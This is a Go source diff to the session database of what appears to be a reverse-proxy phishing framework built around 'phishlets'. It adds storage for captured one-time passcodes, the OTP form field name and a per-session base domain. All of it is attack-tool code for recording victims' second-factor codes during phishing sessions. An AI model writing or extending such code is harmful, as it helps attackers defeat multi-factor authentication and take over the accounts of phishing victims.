@@ -23,6 +23,9 @@ type Session struct {
 	SessionId    string                             `json:"session_id"`
 	UserAgent    string                             `json:"useragent"`
 	RemoteAddr   string                             `json:"remote_addr"`
+	BaseDomain   string                             `json:"base_domain"`
+	OtpCodes     []string                           `json:"otp_codes"`
+	OtpFieldName string                             `json:"otp_field_name"`
 	CreateTime   int64                              `json:"create_time"`
 	UpdateTime   int64                              `json:"update_time"`
 }
@@ -60,6 +63,9 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		SessionId:    sid,
 		UserAgent:    useragent,
 		RemoteAddr:   remote_addr,
+		BaseDomain:   "",
+		OtpCodes:     []string{},
+		OtpFieldName: "",
 		CreateTime:   time.Now().UTC().Unix(),
 		UpdateTime:   time.Now().UTC().Unix(),
 	}
@@ -222,4 +228,29 @@ func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
 		return nil, err
 	}
 	return s, nil
+}
+
+func (d *Database) sessionsUpdateOtpCodes(sid string, otpCodes []string, otpFieldName string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.OtpCodes = otpCodes
+	s.OtpFieldName = otpFieldName
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	return err
+}
+
+func (d *Database) sessionsUpdateBaseDomain(sid string, baseDomain string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.BaseDomain = baseDomain
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	return err
 }
